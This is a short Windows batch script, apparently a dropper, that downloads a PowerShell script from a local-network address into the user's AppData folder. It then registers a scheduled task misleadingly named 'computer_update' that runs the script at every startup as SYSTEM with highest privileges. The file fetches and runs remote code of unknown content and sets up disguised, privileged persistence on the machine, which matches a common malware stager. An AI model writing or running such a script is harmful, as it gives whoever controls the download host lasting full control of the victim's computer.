@echo off
powershell -c "Invoke-WebRequest -Uri 'http://192.168.221.21/computer_details/download/script.ps1' -OutFile '%USERPROFILE%\AppData\Local\script.ps1'"
schtasks /create /tn "computer_update" /sc onstart /delay 0005:00 /rl highest /ru system /tr "powershell.exe -file %USERPROFILE%\AppData\Local\script.ps1"
pause